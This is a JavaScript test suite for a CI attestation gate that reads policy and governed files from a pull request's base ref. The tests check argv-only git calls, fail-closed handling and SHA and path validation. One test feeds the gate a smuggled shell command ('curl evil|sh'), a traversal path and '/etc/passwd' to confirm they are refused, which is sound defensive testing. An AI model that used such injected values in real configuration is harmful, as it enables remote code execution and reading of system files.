import { describe, it, expect } from "vitest";

import { attestationGateInputs } from "../src/attestation-gate-inputs.mjs";
import { hashGovernanceFiles } from "../src/attestation.mjs";

const HEAD = "a".repeat(40);
const BASE = "b".repeat(40);
const MB = "c".repeat(40);

const POLICY = {
  attestation: {
    enforce: true,
    governance_files: [".local-attest.config.mjs", ".dotbabel.json"],
    required_legs: ["test", "quality"],
    trusted_associations: ["OWNER"],
  },
};

/**
 * A `deps.run` stub that answers git by argv shape. Every call is recorded, so
 * a test can assert that nothing reached a shell and that reads came from the
 * base ref rather than the head.
 */
function makeDeps({ policy = POLICY, files = {}, catFile = 0, mergeBase = MB } = {}) {
  const calls = [];
  const run = (argv) => {
    calls.push(argv);
    const [, sub] = argv;
    if (sub === "cat-file") return { status: catFile, stdout: "", stderr: "" };
    if (sub === "merge-base") {
      return mergeBase === null
        ? { status: 128, stdout: "", stderr: "not a commit" }
        : { status: 0, stdout: `${mergeBase}\n`, stderr: "" };
    }
    if (sub === "show") {
      const [, path] = String(argv[2]).split(":");
      if (path === ".dotbabel.json") {
        return policy === null
          ? { status: 128, stdout: "", stderr: "" }
          : { status: 0, stdout: typeof policy === "string" ? policy : JSON.stringify(policy), stderr: "" };
      }
      return path in files
        ? { status: 0, stdout: files[path], stderr: "" }
        : { status: 128, stdout: "", stderr: "" };
    }
    return { status: 0, stdout: "", stderr: "" };
  };
  return { deps: { run }, calls };
}

const view = (over = {}) => ({ headRefOid: HEAD, baseRefOid: BASE, ...over });

describe("attestationGateInputs", () => {
  it("returns the enforced input set when the base ref opts in", () => {
    const { deps } = makeDeps();
    const out = attestationGateInputs(deps, view(), []);
    expect(out.attestationEnforced).toBe(true);
    expect(out.attestationTrustedAssociations).toEqual(["OWNER"]);
    expect(out.requiredLegs).toEqual(["test", "quality"]);
    expect(out.expectedMergeBase).toBe(MB);
    expect(out.expectedConfigHash).toMatch(/^sha256:[0-9a-f]{64}$/);
  });

  it("supplies headRefOid itself rather than inheriting it from the criteria half", () => {
    // The regression this file exists for. `criteriaGateInputs` returns a bare
    // `{}` whenever no spec is in scope, so a gather that relied on its spread
    // reported ATTESTATION_INVALID ("head SHA could not be read") for every
    // pull request that happened to touch nothing spec-linked.
    const { deps } = makeDeps();
    expect(attestationGateInputs(deps, view(), []).headRefOid).toBe(HEAD);
  });

  it("blocks instead of disabling itself when the base commit is not in this clone", () => {
    // The fail-open. Previously an unreadable base produced `{}`, which is
    // indistinguishable from "the trunk declares no policy" — so a shallow
    // clone or an unfetched base silently turned the whole ladder off.
    const { deps, calls } = makeDeps({ catFile: 1 });
    const out = attestationGateInputs(deps, view(), []);
    expect(out.attestationEnforced).toBe(true);
    expect(out.attestationBaseUnreadable).toBe(BASE);
    expect(out.headRefOid).toBe(HEAD);
    // It refuses before reading anything else.
    expect(calls.some((c) => c[1] === "show")).toBe(false);
  });

  it("returns {} when the base ref declares no attestation policy", () => {
    // The bootstrap path, and every repository that never opts in. Distinct
    // from an unreadable base on purpose.
    expect(attestationGateInputs(makeDeps({ policy: {} }).deps, view(), [])).toEqual({});
    expect(attestationGateInputs(makeDeps({ policy: null }).deps, view(), [])).toEqual({});
  });

  it("returns {} when the policy exists but enforce is not true", () => {
    const policy = { attestation: { enforce: false, required_legs: ["test"] } };
    expect(attestationGateInputs(makeDeps({ policy }).deps, view(), [])).toEqual({});
  });

  it("returns {} on an unparseable base config rather than guessing a policy", () => {
    expect(attestationGateInputs(makeDeps({ policy: "{ not json" }).deps, view(), [])).toEqual({});
  });

  it("reads policy and governed bytes from the base ref, never the head", () => {
    const { deps, calls } = makeDeps();
    attestationGateInputs(deps, view(), []);
    const shows = calls.filter((c) => c[1] === "show").map((c) => c[2]);
    expect(shows.length).toBeGreaterThan(0);
    for (const spec of shows) expect(spec.startsWith(`${BASE}:`)).toBe(true);
    expect(shows.some((spec) => spec.startsWith(`${HEAD}:`))).toBe(false);
  });

  it("never builds a shell string — every git call is argv", () => {
    const { deps, calls } = makeDeps();
    attestationGateInputs(deps, view(), []);
    for (const argv of calls) {
      expect(Array.isArray(argv)).toBe(true);
      expect(argv[0]).toBe("git");
    }
  });

  it("refuses a governed path that is not a plain relative repo path", () => {
    // The list is reviewed base-ref content, but it reaches `git show`. An
    // entry carrying shell metacharacters or escaping the repository is a
    // configuration bug worth refusing rather than hashing around.
    const policy = {
      attestation: { enforce: true, governance_files: [".dotbabel.json; curl evil|sh", "../outside", "/etc/passwd"] },
    };
    const { deps, calls } = makeDeps({ policy });
    const out = attestationGateInputs(deps, view(), []);
    expect(out.expectedConfigHash).toBe(hashGovernanceFiles([]));
    expect(calls.filter((c) => c[1] === "show").map((c) => c[2])).toEqual([`${BASE}:.dotbabel.json`]);
  });

  it("falls back to the default governed set when the policy names none", () => {
    const policy = { attestation: { enforce: true } };
    const { deps, calls } = makeDeps({ policy });
    const out = attestationGateInputs(deps, view(), []);
    expect(out.expectedConfigHash).toMatch(/^sha256:/);
    const shows = calls.filter((c) => c[1] === "show").map((c) => c[2]);
    expect(shows).toContain(`${BASE}:.local-attest.config.mjs`);
  });

  it("hashes a missing governed file distinctly from an empty one", () => {
    const present = makeDeps({ files: { ".local-attest.config.mjs": "", ".dotbabel.json": "" } });
    const absent = makeDeps();
    expect(attestationGateInputs(present.deps, view(), []).expectedConfigHash).not.toBe(
      attestationGateInputs(absent.deps, view(), []).expectedConfigHash,
    );
  });

  it("changes the config hash when a governed byte changes", () => {
    const a = makeDeps({ files: { ".local-attest.config.mjs": 'command: "npm test"' } });
    const b = makeDeps({ files: { ".local-attest.config.mjs": 'command: "true"' } });
    expect(attestationGateInputs(a.deps, view(), []).expectedConfigHash).not.toBe(
      attestationGateInputs(b.deps, view(), []).expectedConfigHash,
    );
  });

  it("leaves expectedMergeBase null when git cannot resolve one", () => {
    const { deps } = makeDeps({ mergeBase: null });
    expect(attestationGateInputs(deps, view(), []).expectedMergeBase).toBeNull();
  });

  it("passes the injected comment list straight through, null included", () => {
    const { deps } = makeDeps();
    expect(attestationGateInputs(deps, view(), null).attestationComments).toBeNull();
    const comments = [{ body: "x" }];
    expect(attestationGateInputs(deps, view(), comments).attestationComments).toBe(comments);
  });

  it("anchors the SHA check at both ends", () => {
    // Unanchored, a 41-character value or one with a prefix would be accepted
    // here and then never equal the oid the gate compares against — evidence
    // that silently matches nothing.
    for (const bad of [`${HEAD}b`, `x${HEAD}`]) {
      expect(attestationGateInputs(makeDeps().deps, view({ headRefOid: bad }), [])).toEqual({});
      expect(attestationGateInputs(makeDeps().deps, view({ baseRefOid: bad }), [])).toEqual({});
    }
  });

  it("returns {} when handed no view at all rather than throwing", () => {
    // The caller passes `gh pr view` output straight through; a failed fetch
    // must produce a verdict, not a TypeError that reads as a tool bug.
    const { deps, calls } = makeDeps();
    for (const v of [undefined, null, {}]) expect(attestationGateInputs(deps, v, [])).toEqual({});
    expect(calls).toHaveLength(0);
  });

  it("returns {} when the base config parses to something with no attestation key", () => {
    // `null` and a bare array both parse fine and have no policy on them.
    for (const raw of ["null", "[]", '{"quality":{}}']) {
      expect(attestationGateInputs(makeDeps({ policy: raw }).deps, view(), [])).toEqual({});
    }
  });

  it("falls back to the default governed set when the list is present but empty", () => {
    // An empty array must not mean "govern nothing" — that would hash nothing
    // and make every attestation match regardless of what the matrix ran.
    const policy = { attestation: { enforce: true, governance_files: [] } };
    const { deps, calls } = makeDeps({ policy });
    attestationGateInputs(deps, view(), []);
    const shows = calls.filter((c) => c[1] === "show").map((c) => c[2]);
    expect(shows).toContain(`${BASE}:.local-attest.config.mjs`);
    expect(shows).toContain(`${BASE}:.dotbabel.json`);
  });

  it("defaults required_legs to empty rather than inventing one", () => {
    const policy = { attestation: { enforce: true } };
    expect(attestationGateInputs(makeDeps({ policy }).deps, view(), []).requiredLegs).toEqual([]);
    const bad = { attestation: { enforce: true, required_legs: "test" } };
    expect(attestationGateInputs(makeDeps({ policy: bad }).deps, view(), []).requiredLegs).toEqual([]);
  });

  it("defaults the trust list to OWNER when the policy gives no usable one", () => {
    for (const val of [undefined, "OWNER"]) {
      const policy = { attestation: { enforce: true, ...(val === undefined ? {} : { trusted_associations: val }) } };
      expect(attestationGateInputs(makeDeps({ policy }).deps, view(), []).attestationTrustedAssociations).toEqual([
        "OWNER",
      ]);
    }
  });

  it("treats an empty merge-base result as unresolved, not as an empty SHA", () => {
    // `git merge-base` can exit 0 with nothing on stdout. Passing "" through
    // would make the gate compare the payload against an empty string.
    const deps = {
      run: (argv) =>
        argv[1] === "merge-base"
          ? { status: 0, stdout: "   \n", stderr: "" }
          : makeDeps().deps.run(argv),
    };
    expect(attestationGateInputs(deps, view(), []).expectedMergeBase).toBeNull();
  });

  it("accepts a plain nested path and refuses an empty one", () => {
    const policy = { attestation: { enforce: true, governance_files: ["plugins/dotbabel/scripts/run-bats.sh", ""] } };
    const { deps, calls } = makeDeps({ policy });
    attestationGateInputs(deps, view(), []);
    const shows = calls.filter((c) => c[1] === "show").map((c) => c[2]);
    expect(shows).toContain(`${BASE}:plugins/dotbabel/scripts/run-bats.sh`);
    expect(shows.some((x) => x === `${BASE}:`)).toBe(false);
  });

  it.each([
    ["a missing head", { headRefOid: undefined }],
    ["a missing base", { baseRefOid: undefined }],
    ["an abbreviated head", { headRefOid: "abc1234" }],
    ["a non-sha base", { baseRefOid: "main" }],
  ])("returns {} on %s without running any command", (_label, over) => {
    const { deps, calls } = makeDeps();
    expect(attestationGateInputs(deps, view(over), [])).toEqual({});
    expect(calls).toHaveLength(0);
  });
});
